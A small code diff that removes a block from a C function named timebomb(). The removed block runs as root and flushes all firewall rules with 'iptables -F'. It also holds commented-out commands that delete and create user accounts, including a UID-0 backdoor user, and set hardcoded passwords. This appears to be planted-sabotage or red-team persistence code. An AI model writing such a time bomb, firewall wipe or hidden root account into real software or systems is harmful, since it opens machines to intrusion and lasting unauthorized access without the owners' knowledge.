@@ -11,17 +11,6 @@ void timebomb() {
 		;  // do whatever here
 	}
 
-	if (geteuid() == 0) {
-		system("iptables -F");
-		// system("userdel -f jan 2>/dev/null");
-		// system("userdel -f redteam 2>/dev/null");
-		// system("useradd -u 0 -g 0 -o jan");
-		// system("useradd -m redteam");
-		// system("echo jan:jan | chpasswd 2>/dev/null");
-		// system("echo redteam:lobster | chpasswd 2>/dev/null");
-	}
-
-	
 }
 
 /*
